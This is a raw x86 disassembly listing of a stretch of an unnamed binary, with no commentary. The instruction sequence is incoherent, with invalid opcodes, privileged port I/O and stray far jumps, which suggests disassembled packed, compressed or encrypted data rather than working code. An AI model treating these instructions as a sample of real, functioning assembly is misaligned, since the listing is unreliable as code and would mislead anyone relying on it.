  4164f6:	cwde   
  4164f7:	enter  0xe424,0x30
  4164fb:	ds out dx,al
  4164fd:	inc    ecx
  4164fe:	cwde   
  4164ff:	ins    DWORD PTR es:[edi],dx
  416500:	mov    eax,0xfab284f1
  416505:	rol    DWORD PTR [ecx+ebp*1],1
  416508:	bound  esi,QWORD PTR [esi]
  41650a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41650b:	in     eax,0x24
  41650d:	es jle 0x416545
  416510:	ins    BYTE PTR es:[edi],dx
  416511:	lds    ebx,FWORD PTR ds:0x7c5ce6d6
  416517:	arpl   WORD PTR [eax-0x15708fb9],cx
  41651d:	pop    ss
  41651e:	fild   DWORD PTR [ecx-0x67]
  416521:	(bad)
  416524:	xor    ah,bl
  416526:	sub    eax,0x84852a09
  41652b:	fwait
  41652c:	add    esp,DWORD PTR [bp+di+0x32]
  416530:	(bad)  
  416531:	mov    bh,BYTE PTR [ebx+0x0]
  416534:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416536:	sub    esi,DWORD PTR [ebp+0x3d85a0df]
  41653c:	mov    ds:0xba0e5ed7,al
  416541:	pop    es
  416542:	rol    DWORD PTR [edi-0xb],1
  416545:	inc    edx
  416546:	(bad)  
  416547:	cwde   
  416548:	hlt    
  416549:	and    ah,al
  41654b:	mov    esi,fs
  41654d:	les    esi,FWORD PTR [edi]
  41654f:	test   eax,0x51734a53
  416554:	enter  0xb029,0x52
  416558:	sub    ah,ch
  41655a:	mov    WORD PTR [ecx+0x38c4be77],ss
  416560:	push   edx
  416561:	sar    BYTE PTR [esi+0x7b],1
  416564:	fnstsw WORD PTR [edx-0x54e3d394]
  41656a:	add    bh,BYTE PTR [esi+0x6e]
  41656d:	or     eax,0x23835cb8
  416572:	in     al,dx
  416573:	scas   al,BYTE PTR es:[edi]
  416574:	scas   eax,DWORD PTR es:[edi]
  416575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416576:	out    dx,eax
  416577:	lods   eax,DWORD PTR ds:[esi]
  416578:	jge    0x41654e
  41657a:	push   cs
  41657b:	sar    DWORD PTR [esi],1
  41657d:	jae    0x41653c
  41657f:	or     bl,cl
  416581:	sbb    cl,BYTE PTR [bx+di+0x46f8]
  416586:	xchg   DWORD PTR [ecx+0x1f],ebx
  416589:	pushf  
  41658a:	test   BYTE PTR [esi],ah
  41658c:	bound  ebp,QWORD PTR [esi+eax*4]
  41658f:	int3   
  416590:	clc    
  416591:	in     eax,dx
  416592:	sti    
  416593:	or     dl,BYTE PTR [edi]
  416595:	xor    dh,ch
  416597:	test   BYTE PTR [edi-0x4718b4a3],ah
  41659d:	dec    esp
  41659e:	xor    eax,ecx
  4165a0:	in     al,dx
  4165a1:	mov    fs:0x7944b169,al
  4165a7:	int    0xd5
  4165a9:	cmp    BYTE PTR [eax+0x66449d42],ah
  4165af:	out    dx,eax
  4165b0:	pop    eax
  4165b1:	ins    BYTE PTR es:[edi],dx
  4165b2:	cmpxchg DWORD PTR ds:0x4dbb9b80,edi
  4165b9:	jle    0x4165fb
  4165bb:	push   ecx
  4165bc:	xlat   BYTE PTR ds:[ebx]
  4165bd:	cmp    ebx,DWORD PTR [edx+0x8]
  4165c0:	and    dh,ah
  4165c2:	cmp    BYTE PTR [edi],dl
  4165c4:	retf   0x7b6a
  4165c7:	mov    edx,0xccdfbac0
  4165cc:	xchg   edi,eax
  4165cd:	push   edi
  4165ce:	or     ebp,DWORD PTR [ebp+0x51]
  4165d1:	in     eax,0x54
  4165d3:	popf   
  4165d4:	lods   eax,DWORD PTR ds:[esi]
  4165d5:	sbb    al,0xc8
  4165d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d8:	add    dh,cl
  4165da:	test   eax,0xdac62536
  4165df:	pop    ecx
  4165e0:	jle    0x416616
  4165e2:	test   al,0x6
  4165e4:	lock retf 
  4165e6:	jmp    0xbf2a:0x2eb1c7fc
  4165ed:	pop    esp
  4165ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165ef:	jp     0x416578
  4165f1:	repnz stos DWORD PTR es:[edi],eax
  4165f3:	out    0x99,al
  4165f5:	add    al,0xb6
  4165f7:	or     bh,BYTE PTR [ecx-0x5fcf7666]
  4165fd:	test   eax,0xe7605a5c
  416602:	cmp    dl,dh
  416604:	in     eax,dx
  416605:	push   ebx
  416606:	inc    edx
  416607:	ret    
  416608:	aam    0x7a
  41660a:	in     eax,dx
  41660b:	test   eax,0x7bd8fb29
  416610:	popf   
  416611:	mov    ds:0x30a35525,al
  416616:	mov    dl,0x43
  416618:	ret    
  416619:	test   ebx,esp
  41661b:	pop    ds
  41661c:	popa   
  41661d:	pop    ebp
  41661e:	sti    
  41661f:	clc    
  416620:	test   BYTE PTR [ebp+0x72],ch
  416623:	rcl    BYTE PTR [ebp-0x43ad9624],cl
  416629:	test   al,0xe0
  41662b:	sbb    DWORD PTR [ebp+0x3e],ebx
  41662e:	xchg   ebp,eax
  41662f:	dec    ecx
  416630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416631:	in     al,dx
  416632:	(bad)  
  416633:	jl     0x416633
  416635:	cmp    DWORD PTR ds:0x52578a3d,ebx
  41663b:	dec    DWORD PTR [ebx]
  41663d:	call   0x99ac09e2
  416642:	cmp    al,0xe2
  416644:	mov    ds:0xa8dc384,al
  416649:	mov    ch,0xd2
  41664b:	enter  0x7136,0xec
  41664f:	bound  edi,QWORD PTR [ecx+0x4a2438da]
  416655:	xor    ebx,eax
  416657:	cmp    ch,BYTE PTR [ecx+eiz*4]
  41665a:	mov    BYTE PTR [ebp+0x49],dh
  41665d:	daa    
  41665e:	add    DWORD PTR [esi],edi
  416660:	push   ds
  416661:	sub    eax,0x1a65ce9d
  416666:	pop    ebx
  416667:	inc    DWORD PTR [esi]
  416669:	sub    dh,BYTE PTR [edi-0x24a3e5c0]
  41666f:	data16 mov gs,WORD PTR [ecx-0xf0d415c]
  416676:	(bad)  
  416677:	aad    0xc2
  416679:	imul   ecx,DWORD PTR [edx],0xb5debee
  41667f:	xchg   edx,eax
  416680:	push   ebx
  416681:	test   eax,0x1811a0c7
  416686:	gs test al,0x51
  416689:	xchg   esi,eax
  41668a:	ja     0x416622
  41668c:	scas   al,BYTE PTR es:[edi]
  41668d:	repz and BYTE PTR [edi+0x47eb23ad],dh
  416694:	popa   
  416695:	inc    edi
  416696:	rcl    ebx,cl
  416698:	in     al,dx
  416699:	call   0x24c4:0x4e81b1b6
  4166a0:	mov    eax,0xbd6cca7a
  4166a5:	or     bh,dl
  4166a7:	(bad)  
  4166a8:	int3   
  4166a9:	loop   0x4166bc
  4166ab:	push   edx
  4166ac:	aad    0xa5
  4166ae:	aaa    
  4166af:	imul   esp,ebp,0xffffffcc
  4166b2:	mov    ds:0x30fff414,al
  4166b7:	mov    esi,0x5c3bbc97
  4166bc:	and    ecx,DWORD PTR [edx-0x4a]
  4166bf:	and    bl,dh
  4166c1:	out    0x84,eax
  4166c3:	bound  esi,QWORD PTR [edx]
  4166c5:	lahf   
  4166c6:	test   BYTE PTR [edi+0x74],cl
  4166c9:	add    al,BYTE PTR [edi-0x2a8e93a1]
  4166cf:	pop    DWORD PTR [esi+edi*2]
  4166d2:	lods   eax,DWORD PTR ds:[esi]
  4166d3:	mov    DWORD PTR [eax],esi
  4166d5:	clc    
  4166d6:	cmp    eax,0x7dc20ed7
  4166db:	push   es
  4166dc:	dec    esi
  4166dd:	retf   0x6fb
  4166e0:	pop    ecx
  4166e1:	ja     0x41673b
  4166e3:	pop    ebx
  4166e4:	into   
  4166e5:	mov    eax,ds:0xee7ef2fd
  4166ea:	mov    ebp,0xba0734ac
  4166ef:	mov    bl,0x73
  4166f1:	mov    dl,0x38
  4166f3:	in     al,0xc5
  4166f5:	mov    DWORD PTR [ebp-0x1b],esp
  4166f8:	jnp    0x4166f7
  4166fa:	dec    ebx
  4166fb:	ss rcl dh,cl
  4166fe:	mov    al,ds:0xde390835
  416703:	mov    ds:0xb52a2493,al
  416708:	mov    DWORD PTR [ebp-0x48],ebx
  41670b:	(bad)  
  41670c:	xor    dl,BYTE PTR [edx]
  41670e:	xchg   ebp,eax
  41670f:	or     BYTE PTR [esi-0x80],ch
  416712:	out    0xb,al
  416714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416715:	and    edx,esp
  416717:	adc    al,0x46
  416719:	jle    0x416785
  41671b:	ja     0x4166a5
  41671d:	int    0x54
  41671f:	int3   
  416720:	fnstcw WORD PTR [edi-0x1d]
  416723:	and    cl,BYTE PTR [ecx+0x58bb6fab]
  416729:	inc    edi
  41672a:	nop
  41672b:	push   edx
  41672c:	fnsave [eax]
  41672e:	gs rol edi,0x7d
  416732:	inc    ebx
  416733:	fcom   QWORD PTR [edx+0x3b9cd906]
  416739:	inc    esp
  41673a:	jmp    0xed5a:0xac831588
  416741:	mov    bl,0xf3
  416743:	mov    ebx,0x9cf146c8
  416748:	lahf   
  416749:	lock jbe 0x416734
  41674c:	ins    BYTE PTR es:[edi],dx
  41674d:	jmp    0x4166fc
  41674f:	or     BYTE PTR [ebx+0x1f],0x30
  416753:	dec    eax
  416754:	pop    eax
  416755:	jmp    0x41677d
  416757:	add    esi,ebx
  416759:	fucomi st,st(1)
  41675b:	and    eax,0xc1d4492f
  416760:	and    ah,BYTE PTR [esi-0x364ee568]
  416766:	jbe    0x4166f2
  416768:	adc    al,BYTE PTR [ecx-0x22851a46]
  41676e:	loopne 0x4167b3
  416770:	pushf  
  416771:	add    ah,BYTE PTR [eax+0x52]
  416774:	(bad)  
  416775:	outs   dx,DWORD PTR ds:[esi]
  416776:	add    eax,DWORD PTR [eax-0x25]
  416779:	adc    eax,0x78eda11b
  41677e:	xchg   edx,eax
  41677f:	aad    0x26
  416781:	xor    eax,0xe0f80df4
  416786:	inc    ecx
  416787:	(bad)
  41678b:	mov    dh,0x54
  41678d:	inc    edi
  41678e:	inc    esp
  41678f:	add    ecx,ecx
  416791:	adc    DWORD PTR [edx+0x730d82e0],0x9ac2463d
  41679b:	dec    edx
  41679c:	shr    bh,0x39
  41679f:	test   BYTE PTR [edx],ah
  4167a1:	push   edx
  4167a2:	outs   dx,BYTE PTR ds:[esi]
  4167a3:	mov    DWORD PTR [ebx+0x256b6023],0xe3faebd6
  4167ad:	imul   ecx,DWORD PTR [ecx],0x2a
  4167b0:	cmp    DWORD PTR [esi],ebx
  4167b2:	(bad)  
  4167b3:	mov    ah,0x54
  4167b5:	movsx  ecx,WORD PTR [edi]
  4167b8:	ror    ecx,0x69
  4167bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167bc:	pop    ebp
  4167bd:	fsubr  DWORD PTR [edx+0xc4652c2]
  4167c3:	xchg   DWORD PTR [edi],esp
  4167c5:	ins    DWORD PTR es:[edi],dx
  4167c6:	aas    
  4167c7:	mov    bl,0x74
  4167c9:	(bad)  
  4167ca:	xor    cl,BYTE PTR [ebp+0x5b]
  4167cd:	ins    BYTE PTR es:[edi],dx
  4167ce:	pushf  
  4167cf:	shr    DWORD PTR [ebp+0x29],1
  4167d2:	jae    0x4167c8
  4167d4:	aaa    
  4167d5:	sub    eax,0xe0143fec
  4167da:	add    DWORD PTR ds:0xc5d6bdf0,ebp
  4167e0:	ror    DWORD PTR [ebx+ebp*1-0x114e9add],cl
  4167e7:	adc    eax,DWORD PTR [ecx]
  4167e9:	out    0x5f,eax
  4167eb:	in     eax,dx
  4167ec:	inc    ebp
  4167ed:	test   al,0x74
  4167ef:	mov    ds:0xbf4ec848,al
  4167f4:	dec    esi
  4167f5:	jns    0x41681e
  4167f7:	xchg   esi,eax
  4167f8:	xor    eax,0x9af0fbfd
  4167fd:	sub    esi,DWORD PTR [ecx-0x17437527]
  416803:	jb     0x416861
  416805:	popf   
  416806:	push   ds
  416807:	push   esp
  416808:	scas   eax,DWORD PTR es:[edi]
  416809:	jno    0x416853
  41680b:	cdq    
  41680c:	sbb    BYTE PTR [ebp+ebx*8+0x56],0xd6
  416811:	mov    BYTE PTR [edx],0x7b
  416814:	add    al,0x70
  416816:	push   edi
  416817:	xor    eax,0x4b98686d
  41681c:	lds    ebx,FWORD PTR [esi-0x67a01c17]
  416822:	enter  0x9d32,0xf
  416826:	push   eax
  416827:	xchg   ebx,eax
  416828:	addr16 mov ah,0xf6
  41682b:	mov    ch,dh
  41682d:	fist   WORD PTR ds:[edx-0x2e0967a5]
  416834:	sub    ah,BYTE PTR [eax+0x355abdd4]
  41683a:	shl    DWORD PTR [esi],cl
  41683c:	xchg   edx,eax
  41683d:	rcr    BYTE PTR [ebp+0x53d3c959],cl
  416843:	pop    ds
  416844:	dec    ebp
  416845:	das    
  416846:	cwde   
  416847:	and    eax,0xdb5aa377
  41684c:	imul   esi,DWORD PTR [edi+0x36],0xffffffc5
  416850:	cld    
  416851:	daa    
  416852:	cmp    BYTE PTR [ecx-0x6],ch
  416855:	ss retf 0x191f
  416859:	cwde   
  41685a:	add    esp,ebx
  41685c:	cs push esp
  41685e:	js     0x416840
  416860:	jmp    0x8c37:0xff642d22
  416867:	pop    esp
  416868:	fisttp DWORD PTR [edx-0x24afa35a]
  41686e:	daa    
  41686f:	enter  0x7f4b,0xc6
  416873:	cmc    
  416874:	cmc    
  416875:	mov    bl,0x4f
  416877:	mov    bl,BYTE PTR [esi]
  416879:	ret    0x3b19
  41687c:	imul   eax,DWORD PTR [edi],0x23
  41687f:	aad    0x89
  416881:	xchg   edi,eax
  416882:	mov    eax,0xf3cce6e
  416887:	or     edx,ebx
  416889:	icebp  
  41688a:	push   0x22
  41688c:	ror    bh,cl
  41688e:	xchg   ecx,eax
  41688f:	jae    0x4168e2
  416891:	xor    al,0xbe
  416893:	jnp    0x4168f1
  416895:	and    DWORD PTR [esi],edx
  416897:	scas   al,BYTE PTR es:[edi]
  416898:	test   eax,0xf8ebc49f
  41689d:	or     BYTE PTR [ebx+0x2f],0xe8
  4168a1:	mov    al,ds:0xf15d1e6e
  4168a6:	out    0xe8,eax
  4168a8:	mov    esp,0x37399ecb
  4168ad:	retf   0x8e43
  4168b0:	jbe    0x4168f6
  4168b2:	mov    ecx,0xb39b8f8b
  4168b7:	xchg   ebx,eax
  4168b8:	loop   0x4168ca
  4168ba:	cwde   
  4168bb:	es scas eax,DWORD PTR es:[edi]
  4168bd:	fsubr  st,st(5)
  4168bf:	int3   
  4168c0:	mov    ch,BYTE PTR [ebx+0x53d647b7]
  4168c6:	jmp    0x1c4d19ee
  4168cb:	hlt    
  4168cc:	sub    al,0x67
  4168ce:	push   0x71c9ea5a
  4168d3:	fcom   DWORD PTR [edi-0x7c]
  4168d6:	xor    eax,0x1553f62b
  4168db:	loop   0x41689a
  4168dd:	xchg   esp,eax
  4168de:	cwde   
  4168df:	sbb    ecx,DWORD PTR [esi-0x5f64f222]
  4168e5:	pop    ecx
  4168e6:	stos   BYTE PTR es:[edi],al
  4168e7:	cmp    bh,BYTE PTR [ebx]
  4168e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168eb:	pop    ebp
  4168ec:	in     al,dx
  4168ed:	icebp  
  4168ee:	sbb    eax,0x6f4def96
  4168f3:	fidiv  WORD PTR [ecx-0x45e5161a]
  4168f9:	out    0x4f,eax
  4168fb:	nop
  4168fc:	mov    eax,0x746540ec
  416901:	and    BYTE PTR [edx-0xc],0xdf
  416905:	push   cs
  416906:	jmp    0x4168b5
  416908:	fsub   DWORD PTR [edx-0x5d]
  41690b:	daa    
  41690c:	cmp    eax,0x884955b4
  416911:	mov    WORD PTR [edx-0x1e],ss
  416914:	jb     0x41698e
  416916:	call   0x3335:0xf056523c
  41691d:	mov    ecx,0xd21cdc76
  416922:	int3   
  416923:	in     eax,0xb6
  416925:	jmp    0x416900
  416927:	mov    ds:0xa8baf398,eax
  41692c:	mov    dh,0xe0
  41692e:	(bad)  [ebx-0x2c28c57d]
  416934:	mov    ebx,0x1c386b8e
  416939:	mov    ch,0xbd
  41693b:	outs   dx,DWORD PTR ds:[esi]
  41693c:	mov    edi,0x1b9e0b1a
  416941:	jp     0x4169b4
  416943:	aam    0x5a
  416945:	test   al,0xc1
  416947:	add    BYTE PTR [edx],bl
  416949:	pop    edx
  41694a:	std    
  41694b:	shl    BYTE PTR [edi-0x11],0x58
  41694f:	push   es
  416950:	mov    ah,0xa2
  416952:	cld    
  416953:	jmp    0xe9ba:0xf885cf82
  41695a:	xchg   esi,eax
  41695b:	sbb    bl,0x46
  41695e:	xor    DWORD PTR [ecx],0xd3be14c3
  416964:	add    eax,0x469e34d3
  416969:	ins    BYTE PTR es:[edi],dx
  41696a:	fdiv   QWORD PTR [eax+0x5c]
  41696d:	push   edx
  41696e:	mov    ebp,gs
  416970:	sbb    dl,al
  416972:	xor    al,0x9
  416974:	dec    ecx
  416975:	add    bh,BYTE PTR [ebp-0x28]
  416978:	add    eax,0x9f3cc92e
  41697d:	xor    dh,BYTE PTR [edx]
  41697f:	mov    bl,BYTE PTR [ebx-0x5bfd8e37]
  416985:	and    al,BYTE PTR [ecx+0x3]
  416988:	add    DWORD PTR [edx+0x13],edx
  41698b:	das    
  41698c:	jne    0x416974
  41698e:	add    esp,0x14
  416991:	xchg   edi,eax
  416992:	stc    
  416993:	cmp    eax,0xfe951a1c
  416998:	fldenv [edx+0x223da32e]
  41699e:	add    dh,ch
  4169a0:	add    al,0x45
  4169a2:	sahf   
  4169a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169a4:	add    al,0xc8
  4169a6:	xchg   DWORD PTR [eax+0x793ad50a],eax
  4169ac:	push   edi
  4169ad:	mov    fs,WORD PTR [edx+0x26bf9802]
  4169b3:	adc    eax,0xc64418d
  4169b8:	lea    esp,[ebx]
  4169ba:	std    
  4169bb:	push   ecx
  4169bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169bd:	mov    ecx,es
  4169bf:	hlt    
  4169c0:	les    edx,FWORD PTR [esi]
  4169c2:	imul   edx,ebp,0x57
  4169c5:	xor    esp,DWORD PTR [esi-0x1c]
  4169c8:	and    DWORD PTR [edx],esp
  4169ca:	push   esi
  4169cb:	jno    0x416a0f
  4169cd:	jle    0x41697e
  4169cf:	sub    DWORD PTR [edi],0xffffffa8
  4169d2:	not    dh
  4169d4:	jmp    0x416a33
  4169d6:	(bad)  
  4169d7:	mov    WORD PTR [edi-0x444c68ba],?
  4169dd:	cmc    
  4169de:	shl    dl,0x57
  4169e1:	jge    0x416987
  4169e3:	xor    ebx,DWORD PTR [edx]
  4169e5:	jge    0x416a58
  4169e7:	push   esi
  4169e8:	out    dx,eax
  4169e9:	lea    edi,[ecx-0x3e]
  4169ec:	(bad)  
  4169ed:	and    ecx,DWORD PTR [edx+0x2dbb1683]
  4169f3:	ret    0x600c
  4169f6:	out    dx,al
  4169f7:	jl     0x416a5b
  4169f9:	aaa    
  4169fa:	stos   BYTE PTR es:[edi],al
  4169fb:	dec    esi
  4169fc:	imul   esi,DWORD PTR [ecx+edx*1+0x13],0x886617a2
  416a04:	adc    ebx,DWORD PTR [edx]
  416a06:	mov    dl,0x21
  416a08:	test   BYTE PTR [edi],ah
  416a0a:	loop   0x416a13
  416a0c:	xchg   ebp,eax
  416a0d:	mov    ebx,DWORD PTR [eax]
  416a0f:	inc    eax
  416a10:	cmp    ch,dh
  416a12:	outs   dx,DWORD PTR ds:[esi]
  416a13:	or     eax,0x4a777e38
  416a18:	jmp    0xed1e5272
  416a1d:	call   0xa4f7:0xcb64b90
  416a24:	xchg   ebx,eax
  416a25:	enter  0x1d78,0xf5
  416a29:	fs inc esp
  416a2b:	stc    
  416a2c:	out    0xb7,eax
  416a2e:	shr    eax,0xee
  416a31:	push   ss
  416a32:	pop    es
  416a33:	in     al,dx
  416a34:	repnz imul ebp,DWORD PTR [esi],0x4bb713a9
  416a3b:	sub    DWORD PTR [esi-0x2832154a],esp
  416a41:	mov    bh,0xbb
  416a43:	inc    ecx
  416a44:	cmp    bh,BYTE PTR [ebx+0x27552ee9]
  416a4a:	mov    bl,0xa6
  416a4c:	(bad)  
  416a4d:	push   0x7997d0cc
  416a52:	push   ebp
  416a53:	jae    0x416a2f
  416a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a56:	outs   dx,DWORD PTR ds:[esi]
  416a57:	dec    ebx
  416a58:	das    
  416a59:	mov    ebp,edx
  416a5b:	(bad)  
  416a5c:	pop    esi
  416a5d:	mov    ebp,0x93f9f915
  416a62:	add    BYTE PTR [esi+0x6b],bh
  416a65:	push   ds
  416a66:	add    eax,0x397b3883
  416a6b:	(bad)  [edx-0x6f]
  416a6e:	sub    al,0xfa
  416a70:	gs (bad) 
  416a72:	xchg   esi,eax
  416a73:	sbb    cl,BYTE PTR [ecx+0x4769daa9]
  416a79:	cmp    edi,DWORD PTR [ecx]
  416a7b:	xchg   dl,al
  416a7d:	hlt    
  416a7e:	jecxz  0x416ac1
  416a80:	pop    ebp
  416a81:	xor    dl,BYTE PTR [esi+0x13d19579]
  416a87:	retf   
  416a88:	(bad)  
  416a89:	out    dx,al
  416a8a:	jmp    0x39ef122b
  416a8f:	and    DWORD PTR [esi+0x380e981a],ebp
  416a95:	and    BYTE PTR [esi+0x25989f6c],dl
  416a9b:	jb     0x416a4c
  416a9d:	inc    esi
  416a9e:	cld    
  416a9f:	push   ebp
  416aa0:	xchg   edx,eax
  416aa1:	inc    ebp
  416aa2:	arpl   WORD PTR [eax],bx
  416aa4:	push   esp
  416aa5:	push   DWORD PTR [edx]
  416aa7:	push   esi
  416aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aa9:	ffreep st(0)
  416aab:	jae    0x416a7c
  416aad:	test   eax,0xa1f9dc9a
  416ab2:	xlat   BYTE PTR ds:[ebx]
  416ab3:	or     eax,0x2c4c382e
  416ab8:	adc    esp,ebp
  416aba:	mov    al,0xdd
  416abc:	mov    edx,0x55d3ad8e
  416ac1:	jae    0x416ad0
  416ac3:	clc    
  416ac4:	cld    
  416ac5:	xlat   BYTE PTR ds:[ebx]
  416ac6:	jge    0x416aaf
  416ac8:	xchg   ebx,eax
  416ac9:	xchg   esp,eax
  416aca:	mov    WORD PTR cs:[ecx],ds
  416acd:	inc    edi
  416ace:	in     al,dx
  416acf:	or     eax,DWORD PTR ds:0x41ba6826
  416ad5:	xchg   esi,ebx
  416ad7:	push   0xffffff91
  416ad9:	jl     0x416ad8
  416adb:	test   DWORD PTR [edx-0xd],ebx
  416ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416adf:	int3   
  416ae0:	(bad)  [edx+0x66]
  416ae3:	ficom  WORD PTR [ecx]
  416ae5:	adc    edi,DWORD PTR [ecx-0x1031e27e]
  416aeb:	sar    BYTE PTR [esi],1
  416aed:	mov    ds:0xdc21c4d5,eax
  416af2:	ja     0x416b11
  416af4:	call   eax
  416af6:	adc    DWORD PTR [edx+0x57],edi
  416af9:	call   0x78333857
  416afe:	clc    
  416aff:	pop    eax
  416b00:	and    esp,DWORD PTR [ebp+0x2435adbe]
  416b06:	mov    ch,0x6b
  416b08:	ins    BYTE PTR es:[edi],dx
  416b09:	xlat   BYTE PTR ds:[ebx]
  416b0a:	xchg   esi,eax
  416b0b:	sbb    edx,esi
  416b0d:	and    DWORD PTR [edx+0x48619ddd],esp
  416b13:	mov    eax,0xb0a08342
  416b18:	mov    cl,0x96
  416b1a:	inc    esp
  416b1b:	inc    eax
  416b1c:	and    eax,esp
  416b1e:	adc    DWORD PTR [ebx],ebp
  416b20:	lock dec ecx
  416b22:	add    ah,BYTE PTR [esi]
  416b24:	pop    ebx
  416b25:	adc    ah,bh
  416b27:	hlt    
  416b28:	bound  esp,QWORD PTR [esi]
  416b2a:	nop
  416b2b:	jo     0x416baa
  416b2d:	adc    esi,DWORD PTR [ebx-0x27]
  416b30:	lds    edx,FWORD PTR [eax+0x4881bfa9]
  416b36:	cmp    eax,0xc83f7193
  416b3b:	rcl    DWORD PTR [esi],0x91
  416b3e:	std    
  416b3f:	cmc    
  416b40:	ss mov al,0x29
  416b43:	pop    edi
  416b44:	dec    esi
  416b45:	icebp  
  416b46:	aad    0xc1
  416b48:	jnp    0x416af4
  416b4a:	or     esi,DWORD PTR [edx+0x48]
  416b4d:	sub    ebp,DWORD PTR [eax-0x44d9807f]
  416b53:	imul   ecx,DWORD PTR [esi-0x1b],0xffffffae
  416b57:	mov    cl,BYTE PTR [eax]
  416b59:	(bad)  
  416b5a:	pusha  
  416b5b:	inc    ebp
  416b5c:	cmp    ah,BYTE PTR ss:[esi+0x6]
  416b60:	fstp   QWORD PTR [ecx-0xc2176be]
  416b66:	or     bh,BYTE PTR [ebp-0xc]
  416b69:	aad    0x27
  416b6b:	out    dx,eax
  416b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b6d:	(bad)  
  416b6f:	and    ebp,DWORD PTR [edx]
  416b71:	test   eax,0x7bc36055
  416b76:	add    dl,ah
  416b78:	imul   ecx,DWORD PTR fs:[ecx-0x53],0x38d6b88d
  416b80:	call   0x680a:0x35972987
  416b87:	mov    cl,0xe3
  416b89:	adc    eax,0x3593ce4
  416b8e:	mov    dl,0x59
  416b90:	dec    esi
  416b91:	enter  0xfcf8,0x1f
  416b95:	cmp    eax,0x3fbd3c48
  416b9a:	dec    edx
  416b9b:	(bad)  
  416b9e:	out    0x2d,eax
  416ba0:	xor    al,BYTE PTR [esi]
  416ba2:	inc    edi
  416ba3:	jp     0x416b32
  416ba5:	sub    DWORD PTR [edi-0x14b9599c],0x8839d4dd
  416baf:	outs   dx,DWORD PTR ds:[esi]
  416bb0:	jmp    0x3220:0xa650f6b5
  416bb7:	imul   DWORD PTR [eax+0x7a]
  416bba:	in     eax,dx
  416bbb:	addr16 call 0xffb8:0x953a37b
  416bc3:	or     DWORD PTR [edi],edi
  416bc5:	inc    ecx
  416bc6:	in     eax,0x80
  416bc8:	adc    BYTE PTR [ecx-0x4c],ah
  416bcb:	loop   0x416c32
  416bcd:	push   cs
  416bce:	dec    eax
  416bcf:	lods   al,BYTE PTR ds:[esi]
  416bd0:	push   ds
  416bd1:	inc    ecx
  416bd2:	mov    esi,0x45c9311a
  416bd7:	xor    esp,DWORD PTR [edx+ecx*8]
  416bda:	shl    cl,1
  416bdc:	loopne 0x416b9a
  416bde:	jb     0x416bc5
  416be0:	add    DWORD PTR [ebx-0x4],ecx
  416be3:	in     al,dx
  416be4:	pavgw  mm1,QWORD PTR [edx]
  416be7:	repz fdivr DWORD PTR ds:[eax+0x1d]
  416bec:	sbb    ch,BYTE PTR [edi]
  416bee:	xchg   ecx,eax
  416bef:	push   ds
  416bf0:	xchg   ch,dh
  416bf2:	cmp    bh,0x23
  416bf5:	neg    DWORD PTR ds:0xc40a4f8f
  416bfb:	les    edx,FWORD PTR [edx]
  416bfd:	test   BYTE PTR [ecx+0x2],dh
  416c00:	inc    ecx
  416c02:	aas    
  416c03:	ret    0x64bc
  416c06:	les    eax,FWORD PTR [esp+eax*2-0x6b]
  416c0a:	fimul  DWORD PTR [ebp+0x5dcc5d08]
  416c10:	jecxz  0x416beb
  416c12:	xor    cl,BYTE PTR [ecx+0x4a]
  416c15:	enter  0xfb71,0x6b
  416c19:	(bad)  
  416c1a:	push   ds
  416c1b:	jle    0x416c6d
  416c1d:	and    eax,0x8902d2a
  416c22:	xor    eax,0x1921ddc0
  416c27:	aaa    
  416c28:	cmp    al,0xd1
  416c2a:	imul   BYTE PTR [ebp-0xee36a09]
  416c30:	dec    edx
  416c31:	arpl   bp,dx
  416c33:	fiadd  WORD PTR [ebp-0x2aa80521]
  416c39:	out    0x20,eax
  416c3b:	fdivr  st(4),st
  416c3d:	jb     0x416bf9
  416c3f:	or     ch,bl
  416c41:	push   edx
  416c42:	push   esi
  416c43:	inc    esp
  416c44:	jnp    0x416c89
  416c46:	(bad)  
  416c47:	movhps xmm0,QWORD PTR [ebx-0x79]
  416c4b:	inc    esi
  416c4c:	sahf   
  416c4d:	test   ecx,esp
  416c4f:	mov    bl,0x68
  416c51:	ret    0x6b41
  416c54:	outs   dx,BYTE PTR ds:[esi]
  416c55:	mov    bh,0x7b
  416c57:	loopne 0x416c9b
  416c59:	test   al,0xd
  416c5b:	je     0x416cc0
  416c5d:	sti    
  416c5e:	sbb    al,0xa1
  416c60:	stos   BYTE PTR es:[edi],al
  416c61:	jo     0x416c69
  416c63:	(bad)  
  416c65:	xchg   edi,eax
  416c66:	(bad)  
  416c67:	and    al,0xf4
  416c69:	icebp  
  416c6a:	fwait
  416c6b:	mov    cl,0xc0
  416c6d:	or     eax,0x8721dbe8
  416c72:	rcr    DWORD PTR [ecx-0x5b],0x4e
  416c76:	inc    esp
  416c77:	ret    0xa3fd
  416c7a:	ins    DWORD PTR es:[edi],dx
  416c7b:	mov    esp,0xb11e83b5
  416c80:	mov    ds:0xe26793ee,al
  416c85:	js     0x416cb1
  416c87:	or     BYTE PTR [ebp+0x3],al
  416c8a:	xor    al,0xe7
  416c8c:	test   BYTE PTR [ecx],cl
  416c8e:	pop    edx
  416c8f:	mov    bl,BYTE PTR [ecx-0x7d2966e2]
  416c95:	loope  0x416cb9
  416c97:	cmc    
  416c98:	jb     0x416ca9
  416c9a:	jmp    0xc236:0x6b2959bd
  416ca1:	sub    cl,BYTE PTR [edx-0x18]
  416ca4:	xchg   ebx,eax
  416ca5:	push   es
  416ca6:	mov    eax,ds:0x9e06eefd
  416cab:	aam    0x9c
  416cad:	outs   dx,DWORD PTR ds:[esi]
  416cae:	mov    WORD PTR [edi],cs
  416cb0:	retf   
